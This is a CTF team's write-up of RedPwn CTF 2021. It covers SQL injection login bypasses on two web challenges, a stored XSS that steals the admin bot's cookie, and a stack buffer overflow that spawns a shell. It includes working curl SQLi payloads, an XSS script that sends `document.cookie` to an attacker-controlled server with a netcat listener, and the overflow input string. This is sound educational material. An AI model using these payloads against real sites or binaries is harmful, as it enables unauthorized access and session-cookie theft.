# RedPwn CTF 2021 Challenge Writups

## Attempted/Solved Challenges

* web/inspect-me
* web/orm-bad
* web/secure
* web/pastebin-1
* rev/wstrings
* pwn/beginner-generic-pwn-number-0
* pwn/printf-please
* pwn/ret2generi-flag-reader

## Introductory Notes

RedPwnCTF2021 was a short 3 days Jeopardy Style online CTF hosted from 10th July, 2021 to 13th July, 2021. Our team
attempted a few problems in the short time and managed to solve all attempted problems. A detailed breakdown of our
approaches and additional notes we found out later from other writeups are included, along with the challenge files,
prompts and solution codes.

### web/orm-bad

---

#### Categeory: Web

#### Difficulty: Easy

#### Keywords: SQL Injection, Javascript, Sqlite

#### Author: TheRealDarkCoder

#### Prompt:>

```text
I just learned about orms today! They seem kinda difficult to implement though... Guess I'll stick to good old raw sql
statements!

orm-bad.mc.ax

Included Files: web/SOLVED_orm-bad/app.js
```

#### Overview

1. `secure.mc.ax` is a simple http(s) webserver. The source code is provided (`app.js`).

2. The website greets us with an authentication page. 

```html
<!DOCTYPE html>

<html lang="en">

<body>
    <div style="text-align:center">

        <h1>Sign in:</h1>
        <form id="login_form" action="/flag" method="POST">
            <label for="username">Username: </label><input type="text" name="username" id="username"><br>
            <label for="password">Password: </label><input type="password" name="password" id="username"><br>
            <input type="submit" name="submit" id="submit" value="Login">
        </form>
    </div>
</body>
```

1. The `app.js` file is analyzed and we find out the following important attack vector.

```js
app.post('/flag', (req, res) => {
            db.all("SELECT * FROM users WHERE username='" + req.body.username + "' AND password='" + req.body.password + "'", (err, rows) => {
                        try {
                            if (rows.length == 0) {
                                res.redirect("/?alert=" + encodeURIComponent("you are not admin :("));
                            } else if (rows[0].username === "admin") {
                                res.redirect("/?alert=" + encodeURIComponent(flag));
                            } else {
                                ...
```

4. The SQL Query is not sanitized and basic SQL Injection techniques are plausible. Our username has to be `admin`.

5. We pass in the following user inputs:
```
username=admin
password=1' or '1' = '1
```

Here the SQL Query would become 

```sql
"SELECT * FROM users WHERE username='admin' AND password='1' or '1' = '1'"
```

...resulting in a `True` output and giving us authentication to the user. And sure enough, we get an authenticated render of the page and get the flag.

6. A simple curl command can also show the redirect url and get the flag, make sure to url decode the string.

```sh
$ curl -d "username=admin&password=1' or '1'='1" -X POST https://orm-bad.mc.ax/flag

Found. Redirecting to /?alert=flag%7Bsqli_overused_again_0b4f6%7D
#flag{sqli_overused_again_0b4f6}
```

##### Flag: flag{sqli_overused_again_0b4f6}

### web/secure

---

#### Categeory: Web

#### Difficulty: Easy

#### Keywords: SQL Injection, Javascript, Sqlite, Base64, Template Literals

#### Author: TheRealDarkCoder

#### Prompt:>

```
Just learned about encryption—now, my website is unhackable!

secure.mc.ax
```

#### Overview:>

1. Upon visiting the website, we get a similar authentication page as web/orm-bad. A source file is given (`web/SOLVED_secure/index.js`)

```html

  <div class="container">
    <h1>Sign In</h1>
    <form>
      <label for="username">Username</label>
      <input type="text" name="username" id="username" />
      <label for="password">Password</label>
      <input type="password" name="password" id="password" />
      <input type="submit" value="Submit" />
    </form>
    <div class="important"></div>
  </div>
  <script>
    (async() => {
      await new Promise((resolve) => window.addEventListener('load', resolve));
      document.querySelector('form').addEventListener('submit', (e) => {
        e.preventDefault();
        const form = document.createElement('form');
        form.setAttribute('method', 'POST');
        form.setAttribute('action', '/login');

        const username = document.createElement('input');
        username.setAttribute('name', 'username');
        username.setAttribute('value',
          btoa(document.querySelector('#username').value)
        );

        const password = document.createElement('input');
        password.setAttribute('name', 'password');
        password.setAttribute('value',
          btoa(document.querySelector('#password').value)
        );

        form.appendChild(username);
        form.appendChild(password);

        form.setAttribute('style', 'display: none');

        document.body.appendChild(form);
        form.submit();
      });
    })();

  
```

2. We first see an attack vector in database initiation

```javascript
const crypto = require('crypto');
const express = require('express');

const db = require('better-sqlite3')('db.sqlite3');
db.exec(`DROP TABLE IF EXISTS users;`);
db.exec(`CREATE TABLE users(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT
);`);
db.exec(`INSERT INTO users (username, password) VALUES (
    '${btoa('admin')}',
    '${btoa(crypto.randomUUID)}'
)`);
```

We see that depreciated function `btoa()` is used.

3. In the front end client, we see the async function used to submit the form data. We see the snippet

```javascript
username.setAttribute('value',
          btoa(document.querySelector('#username').value)
        );
```

4. The POST data is also converted to base64 using btoa().

5. However, if we analyze the backend code even more, we see the login handling snippet

```javascript
const query = `SELECT id FROM users WHERE
          username = '${req.body.username}' AND
          password = '${req.body.password}';`;
  try {
    const id = db.prepare(query).get()?.id;
```
Here Javascript ES6 Template literals are used to pass in the user data (which is already base64 encoded from client side). But ES6 Template literals won't save one from SQL Injection. So all we have to do is keep the username a base64 encode of `admin` and the password an SQLI payload (`1' or '1'='1'`) like the previous challenge.

6. The following curl post request works just fine
```sh
$ curl -d "username=YWRtaW4=&password=1' or '1' = '1" -X POST https://secure.mc.ax/login

Found. Redirecting to /?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D
#flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}
```

##### Flag: flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}

### web/pastebin-1

---

#### Categeory: Web

#### Difficulty: Medium

#### Keywords: XSS, Cookie Hijacking

#### Author: TheRealDarkCoder

#### Prompt:>

```
Ah, the classic pastebin. Can you get the admin's cookies?

pastebin-1.mc.ax

Admin bot: https://admin-bot.mc.ax/pastebin-1
```

#### Overview:>

1. As the prompt suggests, it is indeed a classic challenge. Upon visiting the website we find a input field which allows us to input any text, and then it stores the text somewhere and gives us a URL which we can use to view the text in the future, hence the name pastebin. The prompt also gives us a link to an admin bot page. The idea is that the admin bot also has a input field which takes the url of any pastebin link. Upon giving the link, the bot visits the link and reads the paste.

2. The backend is written in rust and provided to us (`web/SOLVED_pastebin-1/main.rs`). However I'm very rusty in rust (pun intended) so I decided not to bother with it, and instead try a classic XSS check. So I created a paste with the content 

```js
<script>alert(1)</script>
```

...and sure enough, we have XSS as an alert pops up.

3. On my remote server I open up a port using netcat

```sh
nc -lvpn 1337
```

... *The server is not behind a NAT as it's my test lab so it is publicly accesible. However I would not recommend using your own home computers instead use online services like [hookbin](https://hookbin.com) which gives you a free http endpoint (Thanks to [a writeup here](https://blog.pipeframe.xyz/post/redpwn2021))*
  
4. I create a simple cookie hijacking XSS script which takes the `document.cookie` and submits it as a get request parameter to my server

```html
<script>document.write('<img src="http://XX.XX.XX.XX:1337/?cookie=' + document.cookie + '" />')</script>
```

This XSS script will try to add a image to the DOM. The source of the image is a link to our attacker server where the `document.cookie` is sent along with a GET parameter in the URL. So when the browser (in this case the admin bot) tries to load in the image, it sends a GET request to the image source along with the cookie.

5. We create the paste and pass the link to the admin bot. The admin bot visits the link and we get the following http request at our server

```http
Connection from [REDACTED]:36854
GET /?cookie=flag=flag{d1dn7_n33d_70_b3_1n_ru57} HTTP/1.1
Host: [REDACTED]:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.148 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br

```

6. The cookie is the flag itself, no need to authenticate as admin.

##### Flag: flag{d1dn7_n33d_70_b3_1n_ru57}

### pwn/beginner-generic-pwn-number-0

---

#### Categeory: Binary Exploitation

#### Difficulty: Easy

#### Keywords: Buffer Overflow, Binary Exploitation

#### Author: TheRealDarkCoder

#### Prompt:> 

```
rob keeps making me write beginner pwn! i'll show him...

nc mc.ax 31199

```

#### Overview:>

1. We have a running service which we can connect to via netcat which is running a ELF binary. The compiled binary (`pwn/beginner-generic-pwn-number-0`) and the C source code (`beginner-generic-pwn-number-0.c`) is provided to us. Upon running the binary the file outputs 3 lines, the first being a random line each time (Taken from an array after an index is randomly generated) and then 2 hardcoded lines. Then the program asks for user input and exits after user input.

2. We take a look at the source code and immidietly find the attack vectors.

```c
...
char heartfelt_message[32];

...

gets(heartfelt_message);

if(inspirational_message_index == -1) {
   system("/bin/sh");
}
```

3. This is a classic buffer overflow challenge where depreciated `gets()` is used to take user input. There seems to be an impossible conditional check which makes a system call to open a shell for us. The value of `inspirational_message_index` has to be set to `-1` for the check to pass but the value is hardcoded to be between 0 and 2 above in the source code.

```c
const char *inspirational_messages[] = {
  "\"𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨\"",
  "\"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬\"",
  "\"𝘮𝘰𝘳𝘦 𝘵𝘩𝘢𝘯 1 𝘸𝘦𝘦𝘬 𝘣𝘦𝘧𝘰𝘳𝘦 𝘵𝘩𝘦 𝘤𝘰𝘮𝘱𝘦𝘵𝘪𝘵𝘪𝘰𝘯\"",
};

int main(void)
{
  srand(time(0));
  long inspirational_message_index = rand() % (sizeof(inspirational_messages) / sizeof(char *));
  ...
```

4. We run the binary with `gdb` and take a look at the assembly code.

```asm
  ...
   0x0000000000401294 <+158>:	call   0x4010a0 <puts@plt>
   0x0000000000401299 <+163>:	lea    rax,[rbp-0x30]
   0x000000000040129d <+167>:	mov    rdi,rax
   0x00000000004012a0 <+170>:	call   0x4010f0 <gets@plt>
   0x00000000004012a5 <+175>:	cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
   0x00000000004012aa <+180>:	jne    0x4012b8 <main+194>
   0x00000000004012ac <+182>:	lea    rdi,[rip+0xf35]        # 0x4021e8
   0x00000000004012b3 <+189>:	call   0x4010c0 <system@plt>
   0x00000000004012b8 <+194>:	mov    eax,0x0
   0x00000000004012bd <+199>:	leave  
   0x00000000004012be <+200>:	ret
```

The above is a small ending part of `main` which we are interested in. We see that after the program outputs the 3 lines (`puts()`) the `main` calls a `gets()`. After which the pointer at `[rbp-0x8]` is compared with `0xffffffffffffffff` which is the hexadecimal of `-1`. So we can assume that `rbp-0x8` contains the address in stack which stores the random value generated at the top. If the check passes (Which naturally won't because `rand()` is hardcoding the value to be between 0 and 2) the binary runs a `system()` call to run a shell. So our target is to overflow the stack to replace the pointer stored at rbp-0x8 with `0xffffffffffffffff`.

5. We set a breakpoint just before the comparison at `0x00000000004012a5`.

```sh
break *0x00000000004012a5
```

Then we run the program with a test input `AABBCCDD` and reach the breakpoint and take a look at all the registers and some stack.

```asm
AABBCCDD

Breakpoint 1, 0x00000000004012a5 in main ()
(gdb) x/wx $rbp-0x8
0x7fffffffe368:	0x00000001
(gdb) x/24wx $rbp
0x7fffffffe370:	0x00000000	0x00000000	0xf7e0fb25	0x00007fff
0x7fffffffe380:	0xffffe468	0x00007fff	0x00000064	0x00000001
0x7fffffffe390:	0x004011f6	0x00000000	0x00001000	0x00000000
0x7fffffffe3a0:	0x004012c0	0x00000000	0x55f78315	0x62ec878e
0x7fffffffe3b0:	0x00401110	0x00000000	0x00000000	0x00000000
0x7fffffffe3c0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/24wx $rsp
0x7fffffffe340:	0x42424141	0x44444343	0x00401200	0x00000000
0x7fffffffe350:	0x00000000	0x00000000	0x00401110	0x00000000
0x7fffffffe360:	0xffffe460	0x00007fff	0x00000001	0x00000000
0x7fffffffe370:	0x00000000	0x00000000	0xf7e0fb25	0x00007fff
0x7fffffffe380:	0xffffe468	0x00007fff	0x00000064	0x00000001
0x7fffffffe390:	0x004011f6	0x00000000	0x00001000	0x00000000
```

We see that our user input is at `0x7fffffffe340` and the $rbp-0x8 is at `0x7fffffffe368`. Subtract the former from the later and we get `40`. So we need exactly `40` bytes of userinput to overflow the stack and reach the address where the value of `inspirational_message_index` is kept. We use python to provide the binary with 40 `A`s and recheck the stack.

```
0x7fffffffe340:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe350:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe360:	0x41414141	0x41414141	0x00000000	0x00000000
```

And indeed we have reached out target.

6. Now we just need to fill the next 8 bytes with hexadecimals `ff`s.
I chose to use python2 here because python3 has some weird print directly as binary problems which I still don't understand. I'm sure it can be done with python3 with very simple syntax change but I did in Python2 anyway. 

```sh
r <<< $(python2 -c "print(b'A'*40 + b'\xff'*8)")
...
0x7fffffffe340:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe350:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe360:	0x41414141	0x41414141	0xffffffff	0xffffffff
```

...and sure enough, our target addresses are now filled with `ff`s, which should allow the `jne` to pass and call the systemcall. `gdb` says 

```
(gdb) c
Continuing.
[Detaching after vfork from child process 12200]
[Inferior 1 (process 12156) exited normally]
```

...which means a system call has spawned in another process, in this case the shell. We try to run the python snippet on the actual binary 

```sh
(python2 -c "print(b'A'*40 + b'\xff'*8)" ; cat) | ./beginner-generic-pwn-number-0
```
*You have to wrap the line with parenthesis and then do this semicolon `cat` trick to get output from the shell. There are other cleaner ways to redirect the output from shell but this method works and is simple to remember.*

```
darkcoder:SOLVED_beginner-generic-pwn-number-0/ (pwn*) $ (python2 -c "print(b'A'*40 + b'\xff'*8)" ; cat) | ./beginner-generic-pwn-number-0
"𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬"
rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!
can you write me a heartfelt message to cheer me up? :(
whoami
darkcoder
```

...and indeed we have a shell. Pass it to the remote server, run `ls; cat flag.txt` and the flag is ours.

##### Flag: flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}